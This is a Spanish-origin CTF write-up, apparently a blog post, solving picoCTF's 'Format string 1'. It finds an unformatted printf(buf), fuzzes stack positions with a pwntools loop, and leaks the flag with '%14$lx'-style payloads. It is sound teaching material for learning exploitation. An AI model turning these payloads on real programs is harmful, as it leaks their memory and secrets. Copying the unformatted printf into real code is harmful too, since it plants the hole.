---
title: "Format string 1"
date: "2025-07-16"
tags: ["picoCTF", "format string"]
---

This exercise gives us a binary and its C source.

The program checks that three files exist in the current directory:

* flag.txt
* secret\_menu\_item\_1
* secret\_menu\_item\_2

If any of those files is missing, the program aborts.

When the three files are there, the program does this:

```c
./format-string-1
Give me your order and I'll read it back to you:
hola
Here's your order: hola
Bye!
```

The program asks for input and prints back what we typed. Since the exercise is called "format strings", let's check the code to see if it really is vulnerable to that kind of attack:

```c
printf("Give me your order and I'll read it back to you:\n");
fflush(stdout);
scanf("%1024s", buf);
printf("Here's your order: ");
printf(buf); // Aquí
```

Sure enough, `printf(buf);` has no format specifier, so it is vulnerable to format strings.

```c
fd = fopen("flag.txt", "r");
if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
}
fgets(flag, 64, fd); // Aquí
```

Because of that `fgets`, the content of flag.txt goes onto the stack, which lets us use the bug to read the flag.

I wrote a fuzzer that does a `%x` on the first 100 positions, so I can see in hex the 100 items closest to the top of the stack:

```python
for i in range(100):
    try:
        p = process(level='error')
        p.sendlineafter(b'Give me your order', '%{}$x'.format(i).encode())
        result = p.recvuntil(b'Bye!')
        print(str(i) + ': ' + str(result))
        p.close()
    except EOFError:
        pass
```

Part of the output:

```bash
14: b" and I'll read it back to you:\nHere's your order: 41414141\nBye!"
```

At position 14 we get `41414141`, which is `AAAA` in hex, the content we had put in `flag.txt` before.

Now that we know the position, we build a payload that prints it:

```c
%14$x
```

Running it:

```c
Give me your order and I'll read it back to you:
%14$x
Here's your order: 6f636970
Bye!
```

From hex to ASCII:

```c
6f636970 → "ocip"
```

It is backwards, which means the flag comes in blocks in reverse order. Let's try more positions:

```c
%14$x,%15$x,%16$x,%17$x,%18$x
```

Output:

```c
Here's your order: 6f636970,6d316e34,33317937,3431665f,64663533
```

In ASCII:

```
ocipm1n431y741f_df53
```

Reversing the blocks:

```
pico4n1m7y13_f1435fd
```

This is still not right. Digging a bit, the binary is 64 bit and we are using `%x`, which prints 32 bits. We switch to `%lx` to get 64 bits:

```c
%14$lx,%15$lx,%16$lx,%17$lx,%18$lx
```

Output:

```c
Here's your order: 7b4654436f636970,355f31346d316e34,3478345f33317937,31395f673431665f,7d653464663533
```

As text:

```c
picoCTF{SECRETO}
```

We have the flag!
